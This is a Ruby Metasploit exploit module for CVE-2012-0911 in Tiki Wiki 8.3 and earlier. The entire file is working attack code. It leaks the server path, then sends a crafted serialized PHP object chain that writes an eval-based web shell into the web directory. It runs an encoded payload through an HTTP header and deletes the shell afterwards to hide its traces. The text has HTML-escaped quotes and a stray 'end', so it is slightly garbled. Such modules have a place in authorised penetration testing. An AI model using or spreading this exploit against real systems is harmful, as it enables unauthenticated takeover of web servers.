# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Tiki Wiki <= 8.3 unserialize() PHP Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a php unserialize() vulnerability in Tiki Wiki <= 8.3
                which could be abused to allow unauthenticated users to execute arbitrary code
                under the context of the webserver user.
 
                The dangerous unserialize() exists in the &#039;tiki-print_multi_pages.php&#039; script,
                which is called with user controlled data from the &#039;printpages&#039; parameter.
                The exploit abuses the __destruct() method from the Zend_Pdf_ElementFactory_Proxy
                class to write arbitrary PHP code to a file on the Tiki Wiki web directory.
 
                In order to run successfully three conditions must be satisfied (1) display_errors
                php setting must be On to disclose the filesystem path of Tiki Wiki, (2) The Tiki
                Wiki Multiprint feature must be enabled to exploit the unserialize() and (3) a php
                version older than 5.3.4 must be used to allow poison null bytes in filesystem related
                functions. The exploit has been tested successfully on Ubuntu 9.10 and Tiki Wiki 8.3.
            },
            &#039;Author&#039;    =>
                [
                    &#039;EgiX&#039;, # Vulnerability discovery and PoC
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-0911&#039; ],
                    [ &#039;BID&#039;, &#039;54298&#039; ],
                    [ &#039;EDB&#039;, &#039;19573&#039; ],
                    [ &#039;URL&#039;, &#039;http://dev.tiki.org/item4109&#039; ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                },
            &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jul 04 2012&#039;
            ))
 
            register_options(
                [
                    OptString.new(&#039;TARGETURI&#039;, [ true, "The base path to the web application", "/tiki/"])
                ], self.class)
    end
 
 
    def on_new_session(client)
            client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
            begin
                client.fs.file.rm(@upload_php)
                print_good("#{@peer} - #{@upload_php} removed to stay ninja")
            rescue
                print_error("#{@peer} - Unable to remove #{f}")
            end
        end
    end
 
    def exploit
        base = target_uri.path
        base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
        @upload_php = rand_text_alpha(rand(4) + 4) + ".php"
        @peer = "#{rhost}:#{rport}"
 
        print_status("#{@peer} - Disclosing the path of the Tiki Wiki on the filesystem")
 
        res = send_request_cgi(
            &#039;uri&#039; => "#{base}tiki-rss_error.php"
        )
 
        if not res or res.code != 200 or not res.body =~ /[> ](\/.*)tiki-rss_error\.php/
            print_error "Tiki Wiki path couldn&#039;t be disclosed. The php setting &#039;display_errors&#039; must be On."
            return
        else
            tiki_path = $1
            print_good "#{@peer} - Tiki Wiki path disclosure: #{tiki_path}"
        end
 
        php_payload = "<?php eval(base64_decode($_SERVER[HTTP_CMD])); ?>"
 
        printpages = "O:29:\"Zend_Pdf_ElementFactory_Proxy\":1:"
        printpages << "{s:39:\"%00Zend_Pdf_ElementFactory_Proxy%00_factory\";O:51:\"Zend_Search_Lucene_Index_SegmentWriter_StreamWriter\":5:"
        printpages << "{s:12:\"%00*%00_docCount\";i:1;s:8:\"%00*%00_name\";s:3:\"foo\";s:13:\"%00*%00_directory\";O:47:\"Zend_Search_Lucene_Storage_Directory_Filesystem\":1:"
        printpages << "{s:11:\"%00*%00_dirPath\";s:#{tiki_path.length + @upload_php.length + 1}:\"#{tiki_path + @upload_php}%00\";}"
        printpages << "s:10:\"%00*%00_fields\";a:1:"
        printpages << "{i:0;O:34:\"Zend_Search_Lucene_Index_FieldInfo\":1:"
        printpages << "{s:4:\"name\";s:#{php_payload.length}:\"#{php_payload}\";}}"
        printpages << "s:9:\"%00*%00_files\";O:8:\"stdClass\":0:{}}}"
 
        print_status("#{@peer} - Exploiting the unserialize() to upload PHP code")
 
        res = send_request_cgi(
        {
            &#039;uri&#039; => "#{base}tiki-print_multi_pages.php",
            &#039;method&#039; => &#039;POST&#039;,
            &#039;vars_post&#039; => {
                &#039;printpages&#039; => printpages
            }
        })
 
        if not res or res.code != 200
            print_error("#{@peer} - Exploit failed: #{res.code}. The Tiki Wiki Multiprint feature must be enabled.")
            return
        end
 
        print_status("#{@peer} - Executing the payload #{@upload_php}")
 
        res = send_request_cgi(
        {
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{base + @upload_php}",
            &#039;headers&#039; => {
                &#039;Cmd&#039; => Rex::Text.encode_base64(payload.encoded)
            }
        })
 
        if res
            print_error("#{@peer} - Payload execution failed: #{res.code}")
            return
        end
 
    end
end



